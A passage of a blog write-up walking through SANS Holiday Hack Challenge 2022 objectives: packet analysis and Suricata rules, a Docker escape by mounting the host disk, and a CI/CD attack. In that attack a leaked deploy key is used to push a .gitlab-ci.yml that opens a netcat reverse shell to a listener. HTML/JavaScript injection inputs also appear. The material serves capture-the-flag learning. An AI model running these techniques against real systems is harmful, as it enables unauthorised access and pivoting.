@@ -1,0 +1,1186 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Matthias Altmann">
+<meta name="description" content="SANS Holiday Hack Challenge 2022 Writeup / Walkthrough">
+
+<title>SANS Holiday Hack Challenge 2022 Writeup</title>
+
+<!-- Bootstrap core CSS -->
+<link href="/blog/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+<!-- Bootstrap core JavaScript -->
+<script src="/blog/vendor/jquery/jquery.min.js"></script>
+<script src="/blog/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+<!-- Custom fonts for this template -->
+<link href="/blog/vendor/fontawesome-free-web/css/all.css" rel="stylesheet" type="text/css">
+<link href='/blog/vendor/fonts-googleapis/lora.css' rel='stylesheet' type='text/css'>
+<link href='/blog/vendor/fonts-googleapis/opensans.css' rel='stylesheet' type='text/css'>
+
+<link rel="shortcut icon" href="/blog/assets/img/favicon.ico" type="image/x-icon">
+<link rel="icon" href="/blog/assets/img/favicon.ico" type="image/x-icon">
+
+<script src="/blog/vendor/jquery/jquery.min.js"></script>
+<script src="/blog/vendor/gsap/gsap.min.js"></script>
+
+<script src="/blog/vendor/highlight/highlight.pack.js"></script>
+<link href="/blog/vendor/highlight/styles/default.css" rel="stylesheet" type="text/css">
+<script>hljs.initHighlightingOnLoad();</script>
+
+<link href="/blog/vendor/malihu-jquery-custom-scrollbar/jquery.mCustomScrollbar.min.css" rel="stylesheet">
+<script src="/blog/vendor/malihu-jquery-custom-scrollbar/jquery.mCustomScrollbar.js"></script>
+
+<!-- Custom styles and scripts -->
+<link href="/blog/css/clean-blog.min.css" rel="stylesheet">
+<script src="/blog/js/clean-blog.min.js"></script>
+
+<link href="/blog/css/svganimations.css" rel="stylesheet">
+
+<script src="/blog/js/sidebar.js"></script>
+<link href="/blog/css/sidebar.css" rel="stylesheet">
+
+<script src="/blog/vendor/mermaid/mermaid-10.9.1.min.js"></script>
+
+<!-- For atom rss feed that browser can detect rss on side -->
+<link href="/blog/feed.xml" type="application/atom+xml" rel="alternate" title="Sitewide Atom feed" />
+
+
+
+
+
+</head>
+
+<body>
+
+<!-- Navigation -->
+<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container px-4 px-lg-5">
+        <a class="navbar-brand" id="nav-link-main" href="/blog/index.html">~/sec/f00tprint</a>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+            Menu
+            <i class="fa fa-bars"></i>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+            <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                <li class="nav-item">
+                    <a class="nav-link px-lg-3 py-3 py-lg-4" href="/blog/index.html">Posts</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link px-lg-3 py-3 py-lg-4" href="/blog/germancorner.html">German Corner</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link px-lg-3 py-3 py-lg-4" href="/blog/hhc/2022/writeup/en">Last Post</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link px-lg-3 py-3 py-lg-4" href="/blog/about.html">About</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+
+<!-- Page Header -->
+<header class="masthead" style="background-image:url('/blog/assets/img/post_backgrounds/HolidayHack2022.jpg')">
+    <div class="overlay"></div>
+    <div class="container position-relative px-4 px-lg-5">
+        <div class="row gx-4 gx-lg-5 justify-content-center">
+            <div class="col-md-10 col-lg-8 col-xl-7">
+                <div class="site-heading">
+                    <h1>SANS Holiday Hack Challenge 2022 Writeup</h1>
+                    
+                    <h2 class="subheading">Walkthrough</h2>
+                    
+                    
+                    <span class="meta">Posted on January 16, 2023</span>
+                    
+
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+
+        
+        <nav id="sidebar" class="sidebar-wrapper active">
+            <div class="sidebar-header">
+                <h3>Table of contents</h3>
+                <h4>SANS Holiday Hack Challenge 2022 Writeup</h4>
+            </div>
+
+            <ul class="list-unstyled components">
+                <ul id="toc" class="section-nav">
+<li class="toc-entry toc-h1"><a href="#introduction">Introduction</a></li>
+<li class="toc-entry toc-h1">
+<a href="#objectives">Objectives</a>
+<ul>
+<li class="toc-entry toc-h2">
+<a href="#1---kringlecon-orientation">1 - KringleCon Orientation</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#talk-to-jingle-ringford">Talk to Jingle Ringford</a></li>
+<li class="toc-entry toc-h3"><a href="#get-your-badge">Get your badge</a></li>
+<li class="toc-entry toc-h3"><a href="#create-a-wallet">Create a wallet</a></li>
+<li class="toc-entry toc-h3"><a href="#use-the-terminal">Use the terminal</a></li>
+<li class="toc-entry toc-h3"><a href="#talk-to-santa">Talk to Santa</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2">
+<a href="#2---recover-the-tolkien-ring">2 - Recover the Tolkien Ring</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#wireshark-practice">Wireshark Practice</a></li>
+<li class="toc-entry toc-h3"><a href="#find-the-next-objective">Find the next objective</a></li>
+<li class="toc-entry toc-h3"><a href="#suricata-regatta">Suricata Regatta</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2">
+<a href="#3---recover-the-elfen-ring">3 - Recover the Elfen Ring</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#clone-with-a-difference">Clone with a Difference</a></li>
+<li class="toc-entry toc-h3"><a href="#find-the-next-objective-1">Find the Next Objective</a></li>
+<li class="toc-entry toc-h3"><a href="#prison-escape">Prison Escape</a></li>
+<li class="toc-entry toc-h3"><a href="#find-the-next-objective-ii">Find the Next Objective II</a></li>
+<li class="toc-entry toc-h3"><a href="#jolly-cicd">Jolly CI/CD</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2">
+<a href="#4---recover-the-web-ring">4 - Recover the Web Ring</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#naughty-ip">Naughty IP</a></li>
+<li class="toc-entry toc-h3"><a href="#credential-mining">Credential Mining</a></li>
+<li class="toc-entry toc-h3"><a href="#404-ftw">404 FTW</a></li>
+<li class="toc-entry toc-h3"><a href="#imds-xxe-and-other-abbreviations">IMDS, XXE, and Other Abbreviations</a></li>
+<li class="toc-entry toc-h3"><a href="#find-the-next-objective-2">Find the Next Objective</a></li>
+<li class="toc-entry toc-h3"><a href="#open-boria-mine-door">Open Boria Mine Door</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2">
+<a href="#5---recover-the-cloud-ring">5 - Recover the Cloud Ring</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#aws-cli-intro">AWS CLI Intro</a></li>
+<li class="toc-entry toc-h3"><a href="#find-the-next-objective-3">Find the Next Objective</a></li>
+<li class="toc-entry toc-h3"><a href="#trufflehog-search">Trufflehog Search</a></li>
+<li class="toc-entry toc-h3"><a href="#find-the-next-objective-ii-1">Find the Next Objective II</a></li>
+<li class="toc-entry toc-h3"><a href="#exploitation-via-aws-cli">Exploitation via AWS CLI</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2">
+<a href="#6---recover-the-burning-ring-of-fire">6 - Recover the Burning Ring of Fire</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#buy-a-hat">Buy a Hat</a></li>
+<li class="toc-entry toc-h3"><a href="#blockchain-divination">Blockchain Divination</a></li>
+<li class="toc-entry toc-h3"><a href="#exploit-a-smart">Exploit a Smart</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toc-entry toc-h1"><a href="#hidden-treasure-chests">Hidden treasure chests</a></li>
+</ul>
+            </ul>
+
+        </nav>
+        
+
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                
+                <button type="button" id="sidebarCollapse" class="btn btn-primary-sm btn btn-block">
+                    <i class="fas fa-align-left"></i>
+                    <span>Toggle Table of Contents</span>
+                </button>
+                
+                <br>
+                <h1 id="introduction">
+<a class="anchor" href="#introduction" aria-hidden="true"><span class="octicon octicon-link"></span></a>Introduction</h1>
+
+<p>Thanks a lot like every year for this great challenge!</p>
+
+<p>Following my solutions.</p>
+
+<h1 id="objectives">
+<a class="anchor" href="#objectives" aria-hidden="true"><span class="octicon octicon-link"></span></a>Objectives</h1>
+
+<h2 id="1---kringlecon-orientation">
+<a class="anchor" href="#1---kringlecon-orientation" aria-hidden="true"><span class="octicon octicon-link"></span></a>1 - KringleCon Orientation</h2>
+
+<h3 id="talk-to-jingle-ringford">
+<a class="anchor" href="#talk-to-jingle-ringford" aria-hidden="true"><span class="octicon octicon-link"></span></a>Talk to Jingle Ringford</h3>
+
+<p>You can talk to him directly at the entrance:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//01_0001_JingleRingford.png" width="100%" alt="Jingle Ringford"></p>
+
+<h3 id="get-your-badge">
+<a class="anchor" href="#get-your-badge" aria-hidden="true"><span class="octicon octicon-link"></span></a>Get your badge</h3>
+
+<p>When you talk to Jingle Ringford he will give you your first badge:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//01_0002_getyourbadge.png" width="100%" alt="Get your badge"></p>
+
+<h3 id="create-a-wallet">
+<a class="anchor" href="#create-a-wallet" aria-hidden="true"><span class="octicon octicon-link"></span></a>Create a wallet</h3>
+
+<p>To create a wallet click on the machine labeled “KTM”:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//01_0003_KTM.png" width="100%" alt="KTM"></p>
+
+<p>Click on “Click here when you’re ready to proceed”. After that you will get 5 coins and a wallet is created for you.
+Note down your wallet address and secret key.</p>
+
+<h3 id="use-the-terminal">
+<a class="anchor" href="#use-the-terminal" aria-hidden="true"><span class="octicon octicon-link"></span></a>Use the terminal</h3>
+
+<p>Click at the terminal next to Jingle Ringford:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//01_0004_terminal.png" width="100%" alt="Terminal"></p>
+
+<p>Follow the instructions, click in the upper pane, type “answer” and press Enter:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//01_0005_answer_enter.png" width="100%" alt="Answer enter"></p>
+
+<h3 id="talk-to-santa">
+<a class="anchor" href="#talk-to-santa" aria-hidden="true"><span class="octicon octicon-link"></span></a>Talk to Santa</h3>
+
+<p>Go through the open door. In the next room you will find Santa with whom you can talk:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//01_0006_santa.png" width="100%" alt="Santa"></p>
+
+<h2 id="2---recover-the-tolkien-ring">
+<a class="anchor" href="#2---recover-the-tolkien-ring" aria-hidden="true"><span class="octicon octicon-link"></span></a>2 - Recover the Tolkien Ring</h2>
+
+<p>Enter the round door between the red KringleCon flags. Go down the ladder. Move to the right and down the next ladder.
+If you look to the right you can enter the Tolkien Ring.</p>
+
+<h3 id="wireshark-practice">
+<a class="anchor" href="#wireshark-practice" aria-hidden="true"><span class="octicon octicon-link"></span></a>Wireshark Practice</h3>
+
+<p>Solution:</p>
+
+<pre><code>0 This all started when I clicked on a link in my email.
+Can you help me?
+-&gt; Enter
+</code></pre>
+
+<pre><code>1 There are objects in the PCAP file that can be exported by
+Wireshark and/or Tshark. What type of objects can be exported from
+this PCAP?
+-&gt; smb,http
+</code></pre>
+
+<pre><code>2 What is the file name of the largest file we can export?
+</code></pre>
+<p>Click at “File” -&gt; “Export Objects” and check which Objects you can export</p>
+
+<p><img src="/blog/assets/img/hhc/2022//02_0001_exportobjects.png" width="100%" alt="export objects"></p>
+
+<p>Look into the size it’s 808 kB for app.php.</p>
+
+<pre><code>-&gt; app.php
+</code></pre>
+
+<pre><code>3 What packet number starts that app.php file?
+</code></pre>
+
+<p>Look again in the export window. The first row contain the packets. app.php 808 kB starts at packet number 687.</p>
+
+<pre><code>-&gt; 687
+</code></pre>
+
+<pre><code>4 What is the IP of the Apache server?
+</code></pre>
+
+<p>Filter for “http”. Look for how the traffic flows between requests and responses. There you can find the answer:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//02_0002_getipofapacheserver.png" width="100%" alt="Get IP of apache server"></p>
+
+<pre><code>-&gt; 192.185.57.242
+</code></pre>
+
+<pre><code>5 What file is saved to the infected host?
+</code></pre>
+
+<p>Find this, if you export HTTP objects and therefore get files. If you do a <code class="language-plaintext highlighter-rouge">cat app.php</code> on this file you get this at the end:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//02_0003_file.png" width="100%" alt="File to find"></p>
+
+<pre><code>-&gt; Ref_Sept24-2020.zip
+</code></pre>
+
+<pre><code>5 Attackers used bad TLS certificates in this traffic. Which
+countries were they registered to? Submit the names of the
+countries in alphabetical order separated by commas (Ex: Norway,
+South Korea)
+</code></pre>
+
+<p>Look into <code class="language-plaintext highlighter-rouge">ssl.handshake == 2</code>, and right click „follow tcp stream“ at the entries. In the stream you
+can find country entries. Aggregate and order them</p>
+
+<p><img src="/blog/assets/img/hhc/2022//02_0004_wireshark_stream.png" width="100%" alt="wireshark stream cert"></p>
+<pre><code>-&gt; Israel, South Sudan, USA
+</code></pre>
+
+<pre><code>7 Is the host infected (Yes/No)?
+</code></pre>
+
+<pre><code>-&gt; Yes
+</code></pre>
+
+<h3 id="find-the-next-objective">
+<a class="anchor" href="#find-the-next-objective" aria-hidden="true"><span class="octicon octicon-link"></span></a>Find the next objective</h3>
+
+<p>Go a little bit more to the right in this room to find Fitzy Shortstack nearly at the end of the room to
+get the next objective.</p>
+
+<p><img src="/blog/assets/img/hhc/2022//02_0005_nextobjectives.png" width="100%" alt="Next objectives"></p>
+
+<h3 id="suricata-regatta">
+<a class="anchor" href="#suricata-regatta" aria-hidden="true"><span class="octicon octicon-link"></span></a>Suricata Regatta</h3>
+
+<p>Solution:</p>
+
+<pre><code>1 Please create a Suricata Rule to catch DNS Lookups for
+adv.epostoday.uk.
+Whenever there's a match, the alert message(msg) should read
+Known bad DNS lookup, possible Dridex infection</code></pre>
+
+<p>You can consult <a href="https://www.digitalocean.com/community/tutorials/understanding-suricata-signatures" target="_blank" rel="noopener noreferrer">Understanding Suricata Signatures</a>.
+This delivers:</p>
+
+<pre><code>-&gt; alert dns any any -&gt; any any (msg:"Known bad DNS lookup,
+possible Dridex infection"; dns.query; content:
+"adv.epostoday.uk"; nocase; sid: 1000001; rev:1;)</code></pre>
+
+<pre><code>2 Develop a Suricata rule that alerts whenever the infected IP
+address 192.168.57.242 communicates with internal systems over
+HTTP.
+When there's a match, the message (msg) should read "Investigate
+suspicious connections, possible Dridex infection"
+</code></pre>
+
+<pre><code>-&gt; alert http 192.185.57.242 any &lt;&gt; $HOME_NET any (msg:"Investigate
+suspicious connections, possible Dridex infection"; sid:1000002;
+rev:1; )
+</code></pre>
+
+<pre><code>3 We heard that some naughty actors are using TLS certificates
+with a specific CN.
+Develop a Suricata rule to match and alert on an SSL certificate
+for heardbellith.Icanwepeh.nagoya.
+When your rule matches, the message (msg) should read "Investigate
+bad certificates, possible Dridex infection"</code></pre>
+
+<pre><code>-&gt; alert tls any any &lt;&gt; any any (msg:"Investigate bad certificates,
+possible Dridex infection"; tls.cert_subject;
+content:"CN=heardbellith.Icanwepeh.nagoya"; sid:1000003; rev:1; )</code></pre>
+
+<pre><code>4 OK, one more to rule them all and in the darkness find them.
+Let's watch for one line from the JavaScript: "let byteCharacters
+= atob"
+Oh, and that string might be GZip compressed - I hope that's OK!
+Just in case they try this again, please alert on that HTTP data
+with message "Suspicious JavaScript function, possible Dridex
+infection"</code></pre>
+
+<pre><code>-&gt; alert http any any &lt;&gt; any any (msg:"Suspicious JavaScript
+function, possible Dridex infection";http.response_body;
+content:"let byteCharacters = atob"; sid: 1000004; rev:1;)</code></pre>
+
+<h2 id="3---recover-the-elfen-ring">
+<a class="anchor" href="#3---recover-the-elfen-ring" aria-hidden="true"><span class="octicon octicon-link"></span></a>3 - Recover the Elfen Ring</h2>
+
+<p>Leave the tolkien ring room, go to the left, down the ladder and to the left. Enter the “Elfen Ring
+room”</p>
+
+<h3 id="clone-with-a-difference">
+<a class="anchor" href="#clone-with-a-difference" aria-hidden="true"><span class="octicon octicon-link"></span></a>Clone with a Difference</h3>
+
+<p>With the boat you can go the the right to find this objective.
+You can use the hint <a href="https://github.com/git-guides/git-clone" target="_blank" rel="noopener noreferrer">https://github.com/git-guides/git-clone</a>.
+The name of the repo is “aws_script.git”. You can google „haugfactory aws_scripts git“ and
+you will find a gitlab repository. Here click on “clone” and use the http url, after that you can clone
+the repo:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//03_0001_gitlab.png" width="100%" alt="Gitlab"></p>
+
+<p><img src="/blog/assets/img/hhc/2022//03_0002_clone_tail_readme.png" width="100%" alt="Clone tail readme"></p>
+
+<p>If you look in the end of the README.md file with <code class="language-plaintext highlighter-rouge">tail README.md</code> you will find the last word
+which is “maintainers”. This you can enter after typing <code class="language-plaintext highlighter-rouge">runtoanswer</code>ö to solve the objective.</p>
+
+<h3 id="find-the-next-objective-1">
+<a class="anchor" href="#find-the-next-objective-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Find the Next Objective</h3>
+
+<p>After solving the last point talk again to Bow Ninecastle to get the next badge.</p>
+
+<p><img src="/blog/assets/img/hhc/2022//03_0003_getthenextbadge.png" width="100%" alt="Get the next badge"></p>
+
+<h3 id="prison-escape">
+<a class="anchor" href="#prison-escape" aria-hidden="true"><span class="octicon octicon-link"></span></a>Prison Escape</h3>
+
+<p>Go with the boat further right, up the stone way and enter the “Elf House”. Here you will find the next challenges.</p>
+
+<p>First look into the systems shows <code class="language-plaintext highlighter-rouge">.dockerenv</code>, so you know you are in a docker container:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//03_0004_dockerenv.png" width="100%" alt="Dockerenv"></p>
+
+<p>To escape this docker you can do:</p>
+
+<pre><code class="bash">sudo bash
+</code></pre>
+
+<p>to get root privileges inside the container.</p>
+
+<p>With that look for devices at the system:</p>
+
+<pre><code class="bash">fdisk -l
+</code></pre>
+
+<p>So there is one disk <code class="language-plaintext highlighter-rouge">/dev/vda</code> which you can mount to get access to the host system:</p>
+
+<pre><code class="bash">mkdir /mnt/hola
+mount /dev/vda /mnt/hola
+cd /mnt/hola
+</code></pre>
+
+<p>Look what you can find here:</p>
+
+<p>In <code class="language-plaintext highlighter-rouge">/home/jailer/.ssh/jail.key.priv</code> you can find the solution:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//03_0005_solutionprisonescape.png" width="100%" alt="Solution Prison Escape"></p>
+
+<p>So the answer is <code class="language-plaintext highlighter-rouge">082bb339ec19de4935867</code>.</p>
+
+<h3 id="find-the-next-objective-ii">
+<a class="anchor" href="#find-the-next-objective-ii" aria-hidden="true"><span class="octicon octicon-link"></span></a>Find the Next Objective II</h3>
+
+<p>Talk to Tinsel Upatree next to the terminal “Prison Escape” again to get the badge.</p>
+
+<p><img src="/blog/assets/img/hhc/2022//03_0006_tinselupatree_next_objectives.png" width="100%" alt="Tinsel Upatree Next Objectives II"></p>
+
+<h3 id="jolly-cicd">
+<a class="anchor" href="#jolly-cicd" aria-hidden="true"><span class="octicon octicon-link"></span></a>Jolly CI/CD</h3>
+
+<p>In the same room find Rippin Proudboot with the Jolly CI/CD challenge.
+Here you start in “grinchum-land” and you get a hint from Tinsel Upatree:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//03_0007_tinsel_Upatree.png" width="100%" alt="Tinsel Upatree Git"></p>
+
+<p>This means try to clone this git repo. Let’s do it (you have to wait some minutes until everything is
+prepared in the system, so try to ping it until the server is there):</p>
+
+<pre><code class="bash">ping gitlab.flag.net.internal
+</code></pre>
+
+<p>After that clone the repo:</p>
+
+<pre><code class="bash">git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
+</code></pre>
+
+<p>Go into the repository:</p>
+
+<pre><code class="bash">cd wordpress.flag.net.internal/
+</code></pre>
+
+<p>Check the logs:</p>
+
+<pre><code class="bash">git log
+</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//03_0008_git_log_whoops.png" width="100%" alt="Git log whoops"></p>
+
+<p>There you can find an interesting log entry “whoops”.</p>
+
+<p>Check out the commit:</p>
+
+<pre><code class="bash">git checkout e19f653bde9ea3de6af21a587e41e7a909db1ca5
+</code></pre>
+
+<p>and do a</p>
+
+<pre><code class="bash">git show
+</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//03_0009_git_show_private_key.png" width="100%" alt="Git Show private key"></p>
+
+<p>Oh, there is a private key!</p>
+
+<p>Copy this in a safe folder before going back to the last commit. 
+Remember from the logs the entry <code class="language-plaintext highlighter-rouge">update the gitlab.ci.yml</code>. This file can be found at the 
+root at <code class="language-plaintext highlighter-rouge">.gitlab-ci.yml</code>.</p>
+
+<pre><code class="bash">mkdir ~/ssh
+cp .ssh/.* ~/ssh
+</code></pre>
+
+<p>Go back to the last commit:</p>
+
+<pre><code class="bash">git checkout main
+</code></pre>
+
+<p>Now try to change the gitlab conf file to check if you can execute cde at the gitlab runner server
+since the config file runs each time a commit is done.
+Look again in the comment above from Tinsel Upatree, he told this:</p>
+
+<blockquote>
+  <p>With this project, once I push a commit, a GitLab runner will automatically deploy the changes to
+production</p>
+</blockquote>
+
+<p>First let’s try to just add a file and push it:</p>
+
+<pre><code class="bash">touch a
+git add a
+git commit -m "push test"
+</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//03_0010_git_push_test.png" width="100%" alt="Git Push Test"></p>
+
+<p>You have to enter a name and an e-mail so we do that. It doesn’t matter
+what values are in there:</p>
+
+<pre><code class="bash">git config --global user.email "you@example.com"
+git config --global user.name "Your Name"
+</code></pre>
+
+<p>Do the commit again:</p>
+
+<pre><code class="bash">git commit -m "push test
+</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//03_0011_git_commit_again.png" width="100%" alt="Git commit again"></p>
+
+<p>Try to push it:</p>
+
+<pre><code class="bash">git push main
+</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//03_0012_git_push_origin_main.png" width="100%" alt="Git push origin main"></p>
+
+<p>So it’s not possible.  You have to set the user corresponding to the private key you found. You can
+achieve this using a ssh config file:</p>
+
+<pre><code class="bash">mkdir ~/.ssh
+vim /home/samways/.ssh/config
+</code></pre>
+
+<p>Enter</p>
+
+<pre><code class="bash">Host gitserv
+    Hostname gitlab.flag.net.internal
+    IdentityFile /home/samways/ssh/.deploy
+    IdentitiesOnly yes
+</code></pre>
+
+<p>Set the origin in the git repo to this new config entry:</p>
+
+<pre><code class="bash">git remote remove origin
+git remote add origin
+git@gitserv:rings-of-powder/wordpress.flag.net.internal.git
+</code></pre>
+
+<p>Let’s find a reverse shell. First find out what is running at the gitlab-runner server. For this you can use an html file.
+The last line rsync command copies a created html file automatically to the root of the web server.
+So for that to do enter this before the rsync command:</p>
+
+<pre><code class="bash">echo $(ls /usr/bin) &gt; test.html
+</code></pre>
+
+<p>Push it and request the html file from the server:</p>
+
+<pre><code class="bash">curl -L http://wordpress.flag.net.internal:80/test.html
+</code></pre>
+
+<p>This delivers:</p>
+
+<pre><code class="bash">awk basename bc beep blkdiscard bunzip2 bzcat bzip2 c_rehash cal
+chvt cksum clear cmp comm cpio crontab cryptpw cut dc deallocvt
+diff dirname docker-machine dos2unix du dumb-init eject env expand
+expr factor fallocate find findssl.sh flock fold free fuser
+getconf getent git git-lfs git-receive-pack git-shell git-upload-
+archive git-upload-pack gitlab-ci-multi-runner gitlab-runner
+groups hd head hexdump hostid iconv id install ipcrm ipcs killall
+last ldd less logger lsof lsusb lzcat lzma lzopcat md5sum mesg
+microcom mkfifo mkpasswd <b>nc</b> nl nmeter nohup nproc nsenter nslookup
+od openssl openvt passwd paste pgrep pkill pmap posixtz printf
+pscan pstree pwdx readlink realpath renice reset resize rsync
+rsync-ssl scanelf scp seq setkeycodes setsid sftp sha1sum
+sha256sum sha3sum sha512sum showkey shred shuf sort split ssh ssh-
+add ssh-agent ssh-copy-id ssh-keygen ssh-keyscan ssh-pkcs11-helper
+ssl_client strings sum tac tail tee test time timeout top tr
+traceroute traceroute6 truncate tty ttysize udhcpc6 unexpand uniq
+unix2dos unlink unlzma unlzop unshare unxz unzip uptime uudecode
+uuencode vi vlock volname wc wget which who whoami whois xargs
+xmlwf xxd xzcat yes
+</code></pre>
+
+<p>And there you can find <em>nc</em>, but this is not a netcat which can do <code class="language-plaintext highlighter-rouge">-e /bin/bash</code> so you have to use
+backpipes or other methods to pipe in a shell. An example can be found <a href="https://spencerdodd.github.io/2017/02/21/reverse_shell_without_nce/" target="_blank" rel="noopener noreferrer">here</a>.</p>
+
+<p>Now you can push a reverse shell in the <code class="language-plaintext highlighter-rouge">.gitlab-ci.yml</code> file.
+Start <code class="language-plaintext highlighter-rouge">tmux</code>, set up two panes with the shortcut Ctrl+B+” and start a netcat listener:</p>
+<pre><code class="bash">nc -nlvp 4444
+</code></pre>
+
+<p>Switch to the other pane using tmux: Ctrl+B+o</p>
+
+<p>Change the content to the following using <code class="language-plaintext highlighter-rouge">vim .gitlab-ci.yml</code>:</p>
+
+<pre><code class="bash">cat .gitlab-ci.yml 
+stages:
+  - deploy
+
+deploy-job:      
+  stage: deploy 
+  environment: production
+  script:
+    - mknod /tmp/backpipe p
+    - /bin/sh 0&lt;/tmp/backpipe | nc 172.18.0.99 4444 1&gt;/tmp/backpipe
+    - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html
+</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//03_0013_gitlab_yml.png" width="100%" alt="gitlab yml"></p>
+
+<p>After that you have a reverse shell to the system (you can switch it to fullscreen with Ctrl+b+z) . To
+find the ring you can use the information found in the rsync command. There is a private key
+referenced. So take this to execute commands directly at the web server. The flag can be found at
+<code class="language-plaintext highlighter-rouge">/flag.txt</code>. Cat the file and you can find the solution:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//03_0014_pivot.png" width="100%" alt="Pivoting"></p>
+
+<p><img src="/blog/assets/img/hhc/2022//03_0015_solution_jolly_cicd.png" width="100%" alt="solution jolly cicd"></p>
+
+<p>Enter the solution <code class="language-plaintext highlighter-rouge">oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT</code> in the objective text field to solve the challenge.</p>
+
+<h2 id="4---recover-the-web-ring">
+<a class="anchor" href="#4---recover-the-web-ring" aria-hidden="true"><span class="octicon octicon-link"></span></a>4 - Recover the Web Ring</h2>
+
+<p>To find the Web ring leave the Elfen Ring, go to right, down the ladder between the candy canes
+and to the right.</p>
+
+<h3 id="naughty-ip">
+<a class="anchor" href="#naughty-ip" aria-hidden="true"><span class="octicon octicon-link"></span></a>Naughty IP</h3>
+
+<p>You can find the solution if you search for the most log entries:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//04_0001_naughty_ip_log_entries.png" width="100%" alt="IP log entries"></p>
+
+<p>After entering the IP you will get 5 coins and the badge.</p>
+
+<h3 id="credential-mining">
+<a class="anchor" href="#credential-mining" aria-hidden="true"><span class="octicon octicon-link"></span></a>Credential Mining</h3>
+
+<p>You have to search in the brute force of the login to find the first username tried. If you search for <code class="language-plaintext highlighter-rouge">www-
+form</code> in the pcap file you can find the username:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//04_0002_credential_mining.png" width="100%" alt="Credential Mining"></p>
+
+<p>It’s <code class="language-plaintext highlighter-rouge">alice</code></p>
+
+<h3 id="404-ftw">
+<a class="anchor" href="#404-ftw" aria-hidden="true"><span class="octicon octicon-link"></span></a>404 FTW</h3>
+
+<p>You can search in the <code class="language-plaintext highlighter-rouge">weberror.log</code> for successful calls with a 200 HTTP code.
+The first successful is <code class="language-plaintext highlighter-rouge">proc</code>:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//04_0003_404_ftw.png" width="100%" alt="404 FTW"></p>
+
+<h3 id="imds-xxe-and-other-abbreviations">
+<a class="anchor" href="#imds-xxe-and-other-abbreviations" aria-hidden="true"><span class="octicon octicon-link"></span></a>IMDS, XXE, and Other Abbreviations</h3>
+
+<p>The URL can be found using filter at <code class="language-plaintext highlighter-rouge">proc</code> and going through the different tcp streams:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//04_0004_IMDS_XXE.png" width="100%" alt="Imds XXE and other abbreviations"></p>
+
+<h3 id="find-the-next-objective-2">
+<a class="anchor" href="#find-the-next-objective-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Find the Next Objective</h3>
+
+<p>You can find Alabaster Snowball in the middle of the room. Talk to him again:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//04_0005_alabaster_snowball.png" width="100%" alt="Alabaster Snowball"></p>
+
+<h3 id="open-boria-mine-door">
+<a class="anchor" href="#open-boria-mine-door" aria-hidden="true"><span class="octicon octicon-link"></span></a>Open Boria Mine Door</h3>
+
+<p>Solutions:</p>
+
+<p>1:</p>
+
+<pre><code class="html">&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
+</code></pre>
+
+<p>2:</p>
+
+<p>Here you have to use HTML and you can use Cascading Style Sheets inside the tag:</p>
+
+<pre><code class="html">&lt;b style="font-size:130px"&gt;&amp;#9608;&amp;#9608;&amp;#9608;&lt;/b&gt;</code></pre>
+
+<p>3:</p>
+
+<p>Here you need JavaScript to set Cascading Style Sheets:</p>
+
+<pre><code class="html">&lt;div
+id="hhcblue"&gt;&amp;#9608;&amp;#9608;&amp;#9608;&lt;/div&gt;&lt;script&gt;myelem=document.ge
+tElementById("hhcblue");
+myelem.style["fontSize"]="200px";
